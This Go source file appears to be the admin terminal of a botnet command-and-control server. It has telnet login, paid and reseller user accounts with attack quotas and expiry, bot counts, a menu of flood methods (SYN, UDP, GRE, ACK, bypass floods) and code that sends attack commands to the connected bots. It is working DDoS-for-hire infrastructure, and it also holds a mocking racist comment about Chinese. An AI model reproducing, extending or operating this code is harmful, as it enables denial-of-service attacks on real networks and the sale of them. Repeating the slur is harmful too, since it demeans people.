package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"golang.org/x/term"

	"github.com/alexeyco/simpletable"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

var languageMap = map[string]map[string]string{
	"english": { // idk this is normal
		"Username":        "\u001B[0mPlease enter your Username\u001B[94m: ",
		"password":        "\u001B[0mPlease enter your password\u001B[94m: ",
		"invalid_login":   "Invalid login attempt. Please try again.",
		"languageChanged": "Language changed successfully.",
		"invalidLanguage": "Invalid language! No changes were made.",
	},
	"russian": { // boom boom boom
		"Username":        "Введите ваше имя пользователя: ",
		"password":        "Введите ваш пароль: ",
		"invalid_login":   "Неверная попытка входа. Пожалуйста, попробуйте еще раз.",
		"languageChanged": "Язык успешно изменен.",
		"invalidLanguage": "Недействительный язык! Изменения не были внесены.",
	},
	"chinese": { // ching billing xiao ching chilling
		"Username":        "请输入您的用户名: ",
		"password":        "请输入您的密码: ",
		"invalid_login":   "登录尝试无效。请再试一次。",
		"languageChanged": "语言修改成功。",
		"invalidLanguage": "无效的语言！没有进行任何更改。",
	},
}

var previousDistribution map[string]int

func (session *Admin) Handle() {
	session.Printf("\033[?1049h")
	session.Printf("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")

	log.Printf(LogInfo + fmt.Sprintf("Attempting to display C2 interface to %s", session.conn.RemoteAddr()))

	session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	secret, err := session.ReadLine("", false)
	if secret != "botnet" || err != nil {
		return
	}
	session.Println("Very well, you know the secret!")
	time.Sleep(300 * time.Millisecond)

	session.Printf("\033[2J\033[1H")
	session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	session.Print("\033[97mSupported\x1b[94m:\x1b[37m english - russian - chinese\r\n\n")
	session.Print("\x1b[97mLanguage\033[94m: \x1b[97m")
	language, err := session.ReadLine("", false)
	if err != nil {
		return
	}

	validLanguages := []string{"english", "russian", "chinese"}
	isValid := false
	for _, l := range validLanguages {
		if language == l {
			isValid = true
			break
		}
	}
	if !isValid {
		session.Printf("\x1b[97mCould not parse \033[94m'\x1b[97m" + language + "\x1b[94m',\x1b[97m Using english\033[94m.\x1b[0m\r\n")
		language = "english"
	}

	// Get Username
	session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	username, err := session.ReadLine(languageMap[language]["Username"], false)
	if err != nil {
		return
	}

	// Get password
	session.conn.SetDeadline(time.Now().Add(60 * time.Second))
	password, err := session.ReadLine(languageMap[language]["password"], true)
	if err != nil {
		return
	}
	session.conn.SetDeadline(time.Now().Add(120 * time.Second))
	session.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		session.conn.Write(append([]byte("\r\033[97mLoading... "), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(100) * time.Millisecond)
	}

	var loggedIn bool
	var userInfo AccountInfo

	loggedIn, userInfo, err = database.TryLogin(username, password, session.conn.RemoteAddr().String())
	if !loggedIn || err != nil {
		log.Printf(LogError + fmt.Sprintf("%s", err))
		switch language {
		case "english":
			session.Printf(languageMap["english"]["invalid_login"])
		case "russian":
			session.Printf(languageMap["russian"]["invalid_login"])
		case "chinese":
			session.Printf(languageMap["chinese"]["invalid_login"])

		}

		buf := make([]byte, 1)
		session.conn.Read(buf)
		return
	}

	time.Sleep(1 * time.Second)

	if userInfo.Expiry.Before(time.Now()) {
		session.Println("Account expired!")
		return
	}
	log.Printf(LogWarn + fmt.Sprintf("logged in %s from %s.", username, session.conn.RemoteAddr()))

	session.conn.SetDeadline(time.Now().Add(120 * time.Second))
	go func() {
		i := 0
		for {
			BotCount := clientList.Count()
			time.Sleep(time.Second)

			var maxAttacksText string

			if userInfo.MaxAttacks == 9999 {
				maxAttacksText = "∞"
			} else {
				maxAttacksText = fmt.Sprintf("%d", userInfo.MaxAttacks)
			}

			totalAttacks, err := database.GetTotalAttacksForUser(userInfo.ID)
			if err != nil {
				return
			}

			if totalAttacks > userInfo.MaxAttacks {
				totalAttacks = userInfo.MaxAttacks
			}

			durationLeft := userInfo.Expiry.Sub(time.Now())
			expiryDays := durationLeft.Hours() / 24
			var expiryText string

			if expiryDays < 1 {
				expiryHours := durationLeft.Hours()
				expiryText = fmt.Sprintf("%.2f hours", expiryHours)
			} else {
				expiryText = fmt.Sprintf("%.2f days", expiryDays)
			}

			usercount, err := database.CountNonAdminUsers()
			title := fmt.Sprintf("bots: %d | slots: %d/%d | attacks: %d/%s | %s left | spots: %d/10",
				BotCount, database.runningatk(), slots, totalAttacks, maxAttacksText, expiryText, usercount)
			time.Sleep(time.Second)
			if _, err := session.conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title))); err != nil {
				session.conn.Close()
				fmt.Println(err)
				break
			}

			i++
			if i%10 == 0 {
				session.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	durleft := userInfo.Expiry.Sub(time.Now())
	xd := durleft.Hours()

	the, err := strconv.ParseFloat(fmt.Sprintf("%.2f", xd), 64)
	if err != nil {
		fmt.Printf("strconv error: %s", err)
	}

	var hours string
	if the > 999999 {
		hours = "∞"
	} else {
		hours = fmt.Sprintf("%.2f", the)
	}

	switch language {
	case "english":
		session.Printf("\033[2J\033[1H\x1b[94m")
		session.Printf("\x1b[97mHello there, \u001B[94m" + username + "\u001B[94m... \u001B[97mWelcome to \x1b[97mbotnet\u001B[94m! \u001B[97mYou have \u001B[97m" + hours + "\u001B[97mh left.\r\n\n\n")

	case "russian":
		session.Printf("\033[2J\033[1H\x1b[94m")
		session.Printf("\x1b[97mПривет, \u001B[94m" + username + "\u001B[94m... \u001B[97mДобро пожаловать в \x1b[97mbotnet\u001B[94m! \u001B[97mУ вас осталось \u001B[97m" + hours + "\u001B[97m часов.\r\n\n\n")

	case "chinese":
		session.Printf("\033[2J\033[1H\x1b[94m")
		session.Printf("\x1b[97m你好，" + username + "… 欢迎来到botnet！你还有" + hours + "小时。\r\n\n\n")
	}

	terminal := term.NewTerminal(session.conn, "")

	for {
		var botCategory string
		var botCount int
		session.Printf("\x1b[97m%s\x1b[94m@\x1b[97mbotnet\x1b[94m: \x1b[0m", username)
		cmd, err := terminal.ReadLine()
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		cmd = strings.ToLower(cmd)
		if cmd == "" {
			continue
		}

		botCount = userInfo.Bots

		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			switch language {
			case "english":
				session.Printf("\033[2J\033[1H\x1b[94m")
				session.Printf("\x1b[97mHello there, \u001B[94m" + username + "\u001B[94m... \u001B[97mWelcome to \x1b[97mbotnet\u001B[94m! \u001B[97mYou have \u001B[97m" + hours + "\u001B[97mh left.\r\n\n\n")

			case "russian":
				session.Printf("\033[2J\033[1H\x1b[94m")
				session.Printf("\x1b[97mПривет, \u001B[94m" + username + "\u001B[94m... \u001B[97mДобро пожаловать в \x1b[97mbotnet\u001B[94m! \u001B[97mУ вас осталось \u001B[97m" + hours + "\u001B[97m часов.\r\n\n\n")

			case "chinese":
				session.Printf("\033[2J\033[1H\x1b[94m")
				session.Printf("\x1b[97m你好，" + username + "… 欢迎来到botnet！你还有" + hours + "小时。\r\n\n\n")
			}
			continue
		}

		if strings.Contains(cmd, ">") {
			continue
		}

		if cmd == "passwd" {
			oldpw, err := session.ReadLine("Current password: ", true)
			if err != nil {
				session.Println("Error reading current password:", err)
				return
			}

			newpw, err := session.ReadLine("New password: ", true)
			if err != nil {
				session.Println("Error reading new password:", err)
				return
			}

			if database.CheckUserPassword(username, oldpw) {
				err := database.UpdatePassword(username, newpw)
				if err != nil {
					fmt.Printf("Error updating password for %s: %s\r\n", username, err)
					return
				}
				session.Println("Password updated successfully.")
			} else {
				session.Println("Invalid current password.")
			}
			continue
		}

		if cmd == "language" {
			session.Println("please select english, russian, chinese (ex. language russian)")
			continue
		}
		if cmd == "fakecount" {
			session.Println("Please use enable or disable as argument!")
			continue
		}
		if strings.HasPrefix(cmd, "fakecount ") {
			if !userInfo.Admin {
				session.Println("You do not have permission to do this!")
				continue
			}
			fakestatus := strings.TrimPrefix(cmd, "fakecount ")
			switch fakestatus {
			case "enable":
				enablefakecount = true
				session.Println("Fake-count enabled successfully!")
			case "disable":
				enablefakecount = false
				session.Println("Fake-count disabled successfully!")
			}
			continue
		}

		if strings.HasPrefix(cmd, "language ") {
			newLang := strings.TrimPrefix(cmd, "language ")
			isValid := false
			for _, l := range validLanguages {
				if newLang == l {
					isValid = true
					break
				}
			}
			if isValid {
				language = newLang
				session.Printf("\x1b[97m%s\033[94m\r\n", languageMap[language]["languageChanged"])
			} else {
				session.Printf("\x1b[97m%s\033[94m\r\n", languageMap[language]["invalidLanguage"])
			}
			continue
		}

		if cmd == "h" || cmd == "help" || cmd == "?" || cmd == "methods" || cmd == "m" || cmd == "meth" {
			session.Printf("\033[97mCommands:\r\n")
			session.Printf(" \033[94m* \033[97mhelp\033[94m: \u001B[0mshow this menu\r\n")
			session.Printf(" \033[94m* \033[97mcls\033[94m: \u001B[0mclear your screen\r\n")
			session.Printf(" \033[94m* \033[97mpasswd\033[94m: \u001B[0mupdate your password\r\n")
			session.Printf(" \033[94m* \033[97mlanguage\033[94m: \u001B[0mchange your prefered language\r\n")
			session.Printf(" \033[94m* \033[97mfloods\033[94m: \u001B[0mview a list of all floods\r\n")
			continue
		}

		if strings.HasPrefix(cmd, "help ") || strings.HasPrefix(cmd, "?") {
			args := strings.TrimPrefix(cmd, "help ")
			switch args {
			case "-a":
				if userInfo.Admin {
					session.Printf("\u001B[97mAdmin commands:\r\n")
					session.Printf(" \033[94m* \u001B[97mbots \u001B[0m<-a/-l>\r\n")
					session.Printf(" \033[94m* \u001B[97mattacks \u001B[0m<status/enable/disable/ongoing/logs>\r\n")
					session.Printf(" \033[94m* \u001B[97musers \u001B[0m<add/remove/edit/list>\r\n")
				} else {
					session.Println("You need admin to view this!")
					continue
				}
			default:
				session.Printf("\033[97mCommands:\r\n")
				session.Printf(" \033[94m* \033[97mhelp\033[94m: \u001B[0mshow this menu\r\n")
				session.Printf(" \033[94m* \033[97mcls\033[94m: \u001B[0mclear your screen\r\n")
				session.Printf(" \033[94m* \033[97mpasswd\033[94m: \u001B[0mupdate your password\r\n")
				session.Printf(" \033[94m* \033[97mlanguage\033[94m: \u001B[0mchange your prefered language\r\n")
				session.Printf(" \033[94m* \033[97mfloods\033[94m: \u001B[0mview a list of all floods\r\n")
			}
			continue
		}
		if cmd == "floods" {
			session.Printf(" \033[94m* \033[97mack\033[94m: \033[0mACK flood\r\n")
			session.Printf(" \033[94m* \033[97mstd\033[94m: \u001B[0mSTD flood\r\n")
			session.Printf(" \033[94m* \033[97mudp\033[94m: \u001B[0mGeneric UDP flood\r\n")
			session.Printf(" \033[94m* \033[97mvse\033[94m: \033[0mValve flood\r\n")
			session.Printf(" \033[94m* \033[97msyn\033[94m: \u001B[0mTCP syn flood\r\n")
			session.Printf(" \033[94m* \033[97mgreip\033[94m: \u001B[0mGRE ip flood\r\n")
			session.Printf(" \033[94m* \033[97mstomp\033[94m: \u001B[0mTCP stomp flood\r\n")
			session.Printf(" \033[94m* \033[97mgreeth\033[94m: \u001B[0mGRE eth flood\r\n")
			session.Printf(" \033[94m* \033[97mudpplain\033[94m: \u001B[0mUDP flood optimized for higher PPS\r\n")
			session.Printf(" \033[94m* \033[97mtcpbypass\033[94m: \u001B[0mTCP bypass flood\r\n")
			session.Printf(" \033[94m* \033[97mudpbypass\033[94m: \u001B[0mUDP bypass flood\r\n")
			continue
		}

		if userInfo.Admin && cmd == "attacks" {
			if attackstatus {
				session.Printf("\x1b[97mAttacks are currently enabled\x1b[94m!\r\n")
			} else {
				session.Printf("\x1b[97mAttacks are currently disabled\x1b[94m!\r\n")
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks ") {
			args := strings.TrimPrefix(cmd, "attacks ")
			if !userInfo.Admin {
				session.Printf("\x1b[97mYou do not have permission to use this command\x1b[94m!\r\n")
			} else {
				switch args {
				case "enable":
					session.Printf("\x1b[97mAttacks are now enabled\x1b[94m!\r\n")
					attackstatus = true
				case "disable":
					session.Printf("\x1b[97mAttacks are now disabled\x1b[94m!\r\n")
					attackstatus = false
				case "status":
					if attackstatus {
						session.Printf("\x1b[97mAttacks are currently enabled\x1b[94m!\r\n")
					} else {
						session.Printf("\x1b[97mAttacks are currently disabled\x1b[94m!\r\n")
					}
				case "logs":
					attacks, err := database.getAllAttacks()
					if err != nil {
						fmt.Println("Error fetching attack logs:", err)
						return
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "Username"},
							{Align: simpletable.AlignCenter, Text: "Host(s)"},
							{Align: simpletable.AlignCenter, Text: "Port"},
							{Align: simpletable.AlignCenter, Text: "Duration"},
							{Align: simpletable.AlignCenter, Text: "Flood Type"},
							{Align: simpletable.AlignCenter, Text: "Time"},
						},
					}

					for _, attack := range attacks {
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: attack["username"]},
							{Align: simpletable.AlignCenter, Text: attack["host"]},
							{Align: simpletable.AlignCenter, Text: attack["port"]},
							{Align: simpletable.AlignCenter, Text: attack["duration"]},
							{Align: simpletable.AlignCenter, Text: attack["floodType"]},
							{Align: simpletable.AlignCenter, Text: attack["time"]},
						}

						table.Body.Cells = append(table.Body.Cells, r)
					}

					table.SetStyle(simpletable.StyleCompactLite)
					session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
				case "ongoing":
					attacks, err := database.getOngoingAttacks()
					if err != nil {
						// handle error
						fmt.Println("Error fetching ongoing attacks:", err)
						return
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "Username"},
							{Align: simpletable.AlignCenter, Text: "Host(s)"},
							{Align: simpletable.AlignCenter, Text: "Port"},
							{Align: simpletable.AlignCenter, Text: "Duration"},
							{Align: simpletable.AlignCenter, Text: "Flood Type"},
							{Align: simpletable.AlignCenter, Text: "Time"},
						},
					}

					for _, attack := range attacks {
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: attack["username"]},
							{Align: simpletable.AlignCenter, Text: attack["host"]},
							{Align: simpletable.AlignCenter, Text: attack["port"]},
							{Align: simpletable.AlignCenter, Text: attack["duration"]},
							{Align: simpletable.AlignCenter, Text: attack["floodType"]},
							{Align: simpletable.AlignCenter, Text: attack["time"]},
						}

						table.Body.Cells = append(table.Body.Cells, r)
					}

					table.SetStyle(simpletable.StyleCompactLite)
					session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
				default:
					session.Printf("\x1b[97mInvalid argument for attacks command\x1b[94m!\r\n")
				}
			}
			continue
		}

		if strings.HasPrefix(cmd, "users ") {
			args := strings.TrimPrefix(cmd, "users ")
			if userInfo.Admin || userInfo.Reseller {
				switch args {
				case "add":
					count, err := database.CountNonAdminUsers()
					if err != nil {
						fmt.Println("Error counting non-admin users:", err)
						continue
					}
					if count > 10 {
						session.Printf("\033[31;1m%s\033[94m\r\n", "You can't currently add users!")
						continue
					}
					prompts := []string{
						"Enter new Username: ",
						"Enter new password: ",
						"Enter wanted bot count (-1 for full net): ",
						"Max attack duration (-1 for none): ",
						"Cooldown time (0 for none): ",
						"Enter User Max Attacks(9999 for inf): ",
						"Enter expiry time (ex. 1d3h5m16s): ",
						"Is the user an admin? (true/false): ",
						"Is the user a reseller? (true/false): ",
					}

					values := make([]string, 0)

					for _, prompt := range prompts {
						value, err := session.ReadLine(prompt, false)
						if err != nil {
							return
						}
						values = append(values, value)
					}

					newUn,
						newPw,
						maxBotsStr,
						durationStr,
						cooldownStr,
						userMaxAttacksStr,
						expiryHoursStr,
						isAdminStr,
						isResellerStr := values[0], values[1], values[2], values[3], values[4], values[5], values[6], values[7], values[8]

					max_bots, _ := strconv.Atoi(maxBotsStr)
					duration, _ := strconv.Atoi(durationStr)
					cooldown, _ := strconv.Atoi(cooldownStr)
					userMaxAttacks, _ := strconv.Atoi(userMaxAttacksStr)
					expiryDuration, err := parseDuration(expiryHoursStr)
					if err != nil {
						session.Printf("\x1b[97mInvalid expiry time format: %v\x1b[94m\r\n", err)
						continue
					}
					expiry := time.Now().Add(expiryDuration).Unix()
					isAdmin, err := strconv.ParseBool(isAdminStr)
					if err != nil {
						return
					}
					isReseller, err := strconv.ParseBool(isResellerStr)
					if err != nil {
						return
					}

					if userInfo.Reseller && isAdmin {
						session.Printf("\033[31;1m%s\033[94m\r\n", "Resellers cannot add admin users.")
						continue
					}

					if userInfo.Reseller && isReseller {
						session.Printf("\033[31;1m%s\033[94m\r\n", "Resellers cannot add other resellers.")
						continue
					}

					session.Printf("New account: \r\n - Username: %s\r\n - Password: %s\r\n - Max bots: %s\r\n - Attack duration: %s\r\n - User Max Attacks: %s\r\n - Expiry: %s\r\n - Admin: %t\r\n - Reseller: %t\r\n", newUn, newPw, maxBotsStr, durationStr, userMaxAttacksStr, expiryHoursStr, isAdmin, isReseller)

					if database.CreateUser(newUn, newPw, max_bots, userMaxAttacks, duration, cooldown, expiry, isAdmin, isReseller, username) {
						session.Printf("\x1b[97mUser added successfully.\033[94m\r\n")
					} else {
						session.Printf("\033[31;1m%s\033[94m\r\n", "Failed to create new user. An unknown error occurred.")
					}
				case "remove":
					usernameToRemove, err := session.ReadLine("Username: ", false)
					if err != nil {
						return
					}

					if userInfo.Reseller && !database.CheckUserCreatedBy(usernameToRemove, username) {
						session.Printf("\033[31;1m%s\033[94m\r\n", "Resellers can only remove users they have created.")
						continue
					}

					err = database.RemoveUser(usernameToRemove)
					if err != nil {
						return
					}
					session.Println("User '" + usernameToRemove + "' removed!")
				case "edit":
					if userInfo.Reseller && !userInfo.Admin {
						session.Printf("\033[31;1m%s\033[94m\r\n", "Resellers cannot edit users.")
						continue
					}

					username, err := session.ReadLine("Username: ", false)
					if err != nil {
						session.Printf("\x1b[97mFailed to read Username\x1b[94m!\r\n")
						continue
					}

					prompts := []string{
						"Enter new username (press enter to skip): ",
						"Enter new password (press enter to skip): ",
						"Enter new max bot count (-1 for full net, press enter to skip): ",
						"Max attack duration (-1 for none, press enter to skip): ",
						"New cooldown time (0 for none, press enter to skip): ",
						"Enter new User Max Attacks (press enter to skip): ",
						"Enter new Total Attacks (press enter to skip): ",
						"Enter new Expiry in hours (ex. 1d3h16m, press enter to skip): ",
						"Enter new Reseller status (true/false, press enter to skip): ",
						"Enter new Created By (press enter to skip): ",
						"Enter new ID (press enter to skip): "}

					fields := []string{
						"username",
						"password",
						"max_bots",
						"duration_limit",
						"cooldown",
						"max_attacks",
						"total_attacks",
						"expiry",
						"reseller",
						"created_by",
						"id"}

					newValues := make(map[string]interface{})

					for i, prompt := range prompts {
						value, err := session.ReadLine(prompt, false)
						if err != nil {
							session.Printf("\x1b[97mFailed to read new value\x1b[94m!\r\n")
							continue
						}

						if value == "" {
							continue
						}

						if fields[i] == "reseller" {
							boolValue, _ := strconv.ParseBool(value)
							newValues[fields[i]] = boolValue
						} else if fields[i] == "expiry" {
							expiryDuration, err := parseDuration(value)
							if err != nil {
								session.Printf("\x1b[97mInvalid expiry time format: %v\x1b[94m\r\n", err)
								continue
							}
							newValues[fields[i]] = time.Now().Add(expiryDuration).Unix()
						} else if fields[i] == "id" {
							intValue, _ := strconv.Atoi(value)
							newValues[fields[i]] = intValue
						} else {
							newValues[fields[i]] = value
						}
					}

					session.Printf("You are about to make the following changes:\r\n")
					for field, newValue := range newValues {
						session.Printf(fmt.Sprintf(" - %s: %v\r\n", field, newValue))
					}

					confirmation, _ := session.ReadLine("Proceed with the changes? (yes/no): ", false)
					if !(confirmation == "yes" || confirmation == "y") {
						session.Printf("\x1b[97mEdit cancelled.\x1b[94m\r\n")
						continue
					}

					// apply changes
					for field, newValue := range newValues {
						err := database.EditUser(username, field, newValue)
						if err != nil {
							session.Printf("\x1b[97mFailed to update %s: %v\x1b[94m\r\n", field, err)
						} else {
							session.Printf("\033[32;1mSuccessfully updated %s.\033[94m\r\n", field)
						}
					}
				case "list":
					if !userInfo.Admin && !userInfo.Reseller {
						session.Printf("\x1b[97mYou do not have permission to use this command\x1b[94m!\r\n")
						continue
					}

					users, err := database.GetUsers()
					if err != nil {
						session.Printf("\x1b[97mFailed to fetch users\x1b[94m!\r\n")
						continue
					}

					table := simpletable.New()

					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "ID"},
							{Align: simpletable.AlignCenter, Text: "Username"},
							{Align: simpletable.AlignCenter, Text: "Password"},
							{Align: simpletable.AlignCenter, Text: "Duration Limit"},
							{Align: simpletable.AlignCenter, Text: "Cooldown"},
							{Align: simpletable.AlignCenter, Text: "Max Bots"},
							{Align: simpletable.AlignCenter, Text: "Admin"},
							{Align: simpletable.AlignCenter, Text: "Max Attacks"},
							{Align: simpletable.AlignCenter, Text: "Total Attacks"},
							{Align: simpletable.AlignCenter, Text: "Expiry"},
							{Align: simpletable.AlignCenter, Text: "Reseller"},
							{Align: simpletable.AlignCenter, Text: "Created By"},
						},
					}

					table.Body = &simpletable.Body{}

					for _, user := range users {
						expiryText := "∞"
						if user.Expiry.Valid {
							expiryTime := time.Unix(user.Expiry.Int64, 0)
							if time.Now().After(expiryTime) {
								expiryText = "Expired"
							} else {
								expiryDays := expiryTime.Sub(time.Now()).Hours() / 24
								if expiryDays <= 999999 {
									expiryText = fmt.Sprintf("%.2f days", expiryDays)
								}
							}
						}

						r := []*simpletable.Cell{
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.ID)},
							{Align: simpletable.AlignRight, Text: user.Username},
							{Align: simpletable.AlignRight, Text: "********"},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.DurationLimit)},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.Cooldown)},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.MaxBots)},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%t", user.Admin)},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.MaxAttacks)},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.TotalAttacks)},
							{Align: simpletable.AlignRight, Text: expiryText},
							{Align: simpletable.AlignRight, Text: fmt.Sprintf("%t", user.Reseller)},
							{Align: simpletable.AlignRight, Text: user.CreatedBy},
						}

						table.Body.Cells = append(table.Body.Cells, r)
					}

					table.SetStyle(simpletable.StyleCompact)
					session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
				case "cute":
					session.Println("The only cute user is ", config.Misc.Cute+" :3")
				default:
					session.Printf("\x1b[97mInvalid argument for users command\x1b[94m!\r\n")
				}
			} else {
				session.Printf("\x1b[97mYou do not have permission to use this command\x1b[94m!\r\n")
			}
			continue
		}

		if userInfo.Admin && cmd == "users" {
			session.Printf("\x1b[97mPlease use users <add/remove/edit/list>\x1b[94m!\r\n")
			continue
		}

		if userInfo.Admin && cmd == "bots" {
			session.Printf("\u001B[97mPlease specify -a or -l\x1b[94m!\r\n")
			continue
		}

		if cmd == "credits" || cmd == "creds" || cmd == "credit" || cmd == "CREDIT" || cmd == "CREDITS" || cmd == "cred" {

			continue
		}

		if strings.HasPrefix(cmd, "bots ") {
			args := strings.TrimPrefix(cmd, "bots ")
			switch args {
			case "-a":
				var BotCount int
				BotCount = clientList.Count()
				session.Printf("\x1b[97mTotal\u001B[94m: %d\r\n", BotCount)
			case "-l":
				if userInfo.Admin {
					m := clientList.Distribution()

					if previousDistribution != nil {
						for k, v := range m {
							change := v - previousDistribution[k]
							changeSign := ""
							colorCode := "92"
							if change > 0 {
								changeSign = "+"
							} else if change < 0 {
								colorCode = "91"
							}
							session.Printf("\x1b[97m%s\u001B[94m: %d (\x1b[%sm%s%d\u001B[94m)\r\n", k, v, colorCode, changeSign, change)
						}
					} else {
						for k, v := range m {
							session.Printf("\x1b[97m%s\u001B[94m: %d\033[94m\r\n", k, v)
						}
					}

					previousDistribution = m
				} else {
					session.Printf("\x1b[97mYou can't view bot arches\033[94m!\r\n")
				}
			}
			continue
		}

		if cmd == "kent" {
			session.Println("hehe~ kent is cute- :3   - Snowie") // no u
			continue
		}

		//cmd = strings.TrimSpace(cmd)

		atk, err := NewAttack(cmd, userInfo.Admin, false)
		if err != nil {
			session.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				session.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					session.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {

					session.conn.Write([]byte(fmt.Sprintf("Sent command to %d clients\r\n", clientList.Count())))
					clientList.QueueBuf(buf, botCount, botCategory)
					// apiatk(method, host, port, time)
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}

func generateRandomPort() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Intn(65535) + 1)
}

func parseDuration(input string) (time.Duration, error) {
	var totalDuration time.Duration

	unitMultiplier := map[string]time.Duration{
		"d": time.Hour * 24,
		"h": time.Hour,
		"m": time.Minute,
		"s": time.Second,
	}

	regex := regexp.MustCompile(`(\d+)([dhms])`)
	matches := regex.FindAllStringSubmatch(input, -1)

	for _, match := range matches {
		value, err := strconv.Atoi(match[1])
		if err != nil {
			return 0, err
		}

		multiplier, exists := unitMultiplier[match[2]]
		if !exists {
			return 0, fmt.Errorf("unknown time unit in %s", match[0])
		}

		totalDuration += time.Duration(value) * multiplier
	}

	return totalDuration, nil
}

func (session *Admin) ReadLine(prompt string, masked bool) (string, error) {
	buf := make([]byte, 2048)
	pos := 0

	if len(prompt) >= 1 {
		session.conn.Write([]byte(prompt))
	}

	for {
		if len(buf) < pos+2 {
			fmt.Println("BUFF LEN:", len(buf))
			fmt.Println("Prevented Buffer Overflow.", session.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := session.conn.Read(buf[pos : pos+1])
		if err != nil || n != 1 {
			return "", err
		}
		switch buf[pos] {
		case 0xFF:
			n, err := session.conn.Read(buf[pos : pos+2])
			if err != nil || n != 2 {
				return "", err
			}
			pos--
		case 0x7F, 0x08:
			if pos > 0 {
				session.conn.Write([]byte("\b \b"))
				pos--
			}
			pos--
		case 0x0D, 0x09:
			pos--
		case 0x0A, 0x00:
			session.conn.Write([]byte("\r\n"))
			return string(buf[:pos]), nil
		case 0x03:
			session.conn.Write([]byte("^C\r\n"))
			return "", nil
		default:
			if buf[pos] == 0x1B {
				buf[pos] = '^'
				session.conn.Write([]byte(string(buf[pos])))
				pos++
				buf[pos] = '['
				session.conn.Write([]byte(string(buf[pos])))
			} else if masked {
				session.conn.Write([]byte("*"))
			} else {
				session.conn.Write([]byte(string(buf[pos])))
			}
		}
		pos++
	}
}
